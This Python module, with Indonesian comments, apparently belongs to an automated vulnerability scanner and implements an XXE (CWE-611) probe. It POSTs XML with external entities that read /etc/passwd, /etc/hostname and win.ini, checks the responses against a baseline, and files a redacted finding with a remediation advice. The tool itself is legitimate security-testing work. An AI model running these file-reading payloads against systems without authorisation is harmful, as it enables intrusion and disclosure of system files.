"""xxe_probe — XML External Entity injection (CWE-611, high->critical).

Teknik error-based/OOB-less: kirim XML dengan external entity membaca
file bukti kecil; bukti = isi file muncul di RESPONS (error message pun
sahuh bila memuat konten file). cease-on-data: 1 baris bukti saja,
tidak ada exfil loop. Guard FP: baseline XML tanpa entity juga dikirim —
marker harus TIDAK ada di baseline.
"""

from __future__ import annotations

from . import http_engine
from .base import Tool, ToolContext, ToolResult, redact
from ..findings import Finding

_TARGETS = [
    ("etc-hostname", "file:///etc/hostname", ""),
    ("etc-passwd", "file:///etc/passwd", "root:"),
    ("win-hostname", "file:///C:/Windows/win.ini", "[fonts]"),
]


class XxeProbeTool(Tool):
    name = "xxe_probe"
    description = ("XXE error-based: external entity -> isi file terlihat "
                   "di respons (termasuk di pesan error). 1 baris bukti, "
                   "cease-on-data, differential baseline.")
    risk_tags = {"active"}
    source_skill = "bounty-high-02"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        url = str(args.get("url") or "")
        if not url:
            return ToolResult(tool=self.name, ok=False, error="args.url wajib")
        content_type = str(args.get("content_type") or "application/xml")

        safe_xml = ("<?xml version=\"1.0\"?>"
                    "<root><data>cyphron-baseline</data></root>")
        ctx.throttle()
        b_st, _h, b_body, _ms = http_engine.http_get(
            url, timeout=ctx.timeout_s, method="POST",
            data=safe_xml.encode(), headers={"Content-Type": content_type})
        ctx.world.request_count += 1

        probes: list[dict] = []
        findings: list[Finding] = []
        for name, uri, marker in _TARGETS:
            if ctx.world.request_count >= ctx.max_requests:
                break
            ctx.throttle()
            xml = ("<?xml version=\"1.0\"?>"
                   "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"" + uri + "\">]>"
                   "<root><data>&xxe;</data></root>")
            st, _h, body, _ms = http_engine.http_get(
                url, timeout=ctx.timeout_s, method="POST",
                data=xml.encode(), headers={"Content-Type": content_type})
            ctx.world.request_count += 1
            hit = (bool(marker) and marker.lower() in body.lower()
                   and marker.lower() not in b_body.lower())
            first_line = ""
            if hit:
                line = next((l for l in body.splitlines()
                             if marker.lower() in l.lower()), "")
                first_line = redact(line[:80])
            probes.append({"target": name, "status": st, "hit": hit})
            if hit:
                findings.append(Finding(
                    tool=self.name,
                    title=f"XXE file read confirmed ({name})",
                    severity="critical" if "passwd" in name else "high",
                    cwe="CWE-611",
                    description=(f"External entity membaca {uri}: baris bukti "
                                 f"'{first_line}' muncul di respons/error. "
                                 f"cease-on-data: tidak ada pembacaan lanjutan "
                                 f"dan tidak ada OOB exfil."),
                    recommendation=("Disable DTD/external entities (libxml "
                                    "NOENT, defusedxml); parse di server tanpa "
                                    "entity resolution."),
                    file_path=None, line_start=None, line_end=None,
                    request=f"POST {url} (DOCTYPE with {uri})",
                    response=f"status={st}; bukti (redacted): {first_line}",
                    confidence=0.9, source_skill=self.source_skill,
                    status="confirmed", evidence_kind="request-response",
                ))
                break  # cease-on-data
        return ToolResult(tool=self.name, ok=True, data={
            "url": url, "baseline_status": b_st, "probes": probes,
        }, findings=findings)
